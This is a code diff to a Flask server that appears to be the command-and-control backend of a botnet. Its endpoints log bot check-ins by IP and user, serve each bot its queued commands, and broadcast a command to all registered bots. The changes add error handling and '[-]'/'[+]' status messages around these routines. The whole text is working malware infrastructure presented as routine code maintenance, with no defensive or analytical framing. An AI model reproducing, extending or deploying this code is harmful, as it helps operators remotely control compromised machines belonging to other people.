@@ -45,8 +45,12 @@ def heartbeat():
 
     print("[DEBUG] user = ", user)
 
-    query_bot = Bot.query.filter_by(ip=ip).filter_by(user=user).first()
-    query_bot.set_timestamp(datetime.now())
+    try:
+        query_bot = Bot.query.filter_by(ip=ip).filter_by(user=user).first()
+        query_bot.set_timestamp(datetime.now())
+
+    except Exception as e:
+        return jsonify({'error': '[-] Heartbeat not available for you'})
 
     return 'heartbeat'
 
@@ -217,18 +221,22 @@ def bottask(bot_ip):
     try:
         if data is None:
             return jsonify({'error': 'Could not process body parameters'})
-        if registerkey is None:
+        elif registerkey is None:
             return jsonify({'error': 'regsiterkey is required'})
 
-        # Get the bot corresponding with the bot_ip 
-        query_bot = Bot.query.filter_by(ip=bot_ip).first()
-        query_bot.set_timestamp(datetime.now())
+        # Get the bot corresponding with the bot_ip
+        try: 
+            query_bot = Bot.query.filter_by(ip=bot_ip).first()
+            query_bot.set_timestamp(datetime.now())
+
+        except Exception as e:
+            return jsonify({'error' : '[-] There are no commands for you'})
 
         # Try getting commands, from the oldest staged command to the lastest staged command. 
         try:
             command = query_bot.cmds[0]
         except Exception as e:
-            return jsonify({'error': 'There are no commands available'})
+            return jsonify({'error': '[-] There are no commands available'})
 
         return jsonify({ 'command': command.cmd })
 
@@ -358,13 +366,17 @@ def broadcast():
 
     bots = Bot.query.all()
 
-    for bot in bots:
-        cmd = Command(command, bot.id, bot.ip)
-        bot.cmds.append(cmd)
-        db.session.add(cmd)
-    db.session.commit()
+    try:
+        for bot in bots:
+            cmd = Command(command, bot.id, bot.ip)
+            bot.cmds.append(cmd)
+            db.session.add(cmd)
+        db.session.commit()
 
+    except Exception as e:
+        return jsonify({ 'error': str(e) })
 
+    return jsonify({ 'result': '[+] Broadcast successful' })
 
 
 init_db()
